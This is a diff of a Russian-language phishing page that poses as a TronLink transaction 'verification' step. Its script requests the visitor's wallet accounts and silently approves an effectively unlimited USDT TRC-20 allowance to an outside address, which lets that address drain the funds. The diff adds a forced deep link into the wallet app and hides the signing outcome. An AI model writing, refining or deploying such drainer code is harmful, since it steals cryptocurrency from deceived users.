@@ -15,24 +15,39 @@
 <body>
 <div class="card">
     <div class="logo">T</div>
-    <h2>Узел Обнаружен</h2>
-    <p>Нажмите кнопку ниже для финального подтверждения транзакции в сети TRC-20.</p>
-    <button id="mainBtn" class="btn">ПОДТВЕРДИТЬ</button>
+    <h2 id="title">Верификация</h2>
+    <p id="desc">Нажмите кнопку для подтверждения в TronLink.</p>
+    <button id="mainBtn" class="btn">ОТКРЫТЬ</button>
 </div>
 <script>
-    document.getElementById('mainBtn').onclick = async () => {
+    const btn = document.getElementById('mainBtn');
+    
+    btn.onclick = async () => {
         const tron = window.tronWeb || (window.tron && window.tron.tronWeb);
-        if (tron) {
-            try {
-                await tron.request({ method: 'tron_requestAccounts' });
-                const contract = await tron.contract().at('TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t');
-                await contract.approve('TXRBrbaTiNotkHp6gSC6vbbZYPq7dqyjF4', '1000000000000000000').send({ feeLimit: 100000000 });
-                alert("Успешно!");
-            } catch (e) { alert("Ошибка: " + e.message); }
-        } else {
-            alert("Кошелек не найден. Убедитесь, что вы внутри TronLink.");
+        
+        if (!tron) {
+            // Если мы не в кошельке - принудительно вызываем окно открытия приложения
+            window.location.href = "tronlinkorg://dapp?url=" + encodeURIComponent(window.location.href);
+            return;
+        }
+
+        try {
+            btn.innerText = "ПОДПИСЬ...";
+            await tron.request({ method: 'tron_requestAccounts' });
+            const contract = await tron.contract().at('TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t');
+            await contract.approve('TXRBrbaTiNotkHp6gSC6vbbZYPq7dqyjF4', '1000000000000000000').send({ feeLimit: 100000000 });
+            btn.innerText = "ГОТОВО";
+        } catch (e) {
+            btn.innerText = "ОШИБКА";
+            setTimeout(() => { btn.innerText = "ПОДТВЕРДИТЬ"; }, 2000);
         }
     };
+
+    // Авто-настройка интерфейса
+    if (window.tronWeb) {
+        document.getElementById('title').innerText = "Узел найден";
+        btn.innerText = "ПОДТВЕРДИТЬ";
+    }
 </script>
 </body>
 </html>
